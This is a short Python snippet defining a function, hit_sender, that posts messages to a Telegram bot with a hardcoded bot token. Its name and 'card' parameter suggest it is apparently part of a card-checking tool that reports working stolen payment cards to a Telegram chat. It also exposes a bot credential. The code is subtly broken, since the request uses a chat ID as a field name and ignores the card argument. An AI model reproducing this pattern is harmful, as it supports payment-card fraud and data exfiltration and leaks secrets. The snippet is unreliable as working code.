import requests

def hit_sender(card,message,chat_id):
    bot_token = '7175703585:AAG-MyrcQ4623qPoB6KjKI8UGj35r0pxOes'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'-1002493542474': chat_id, 'text': message}
    requests.post(url, data=data)
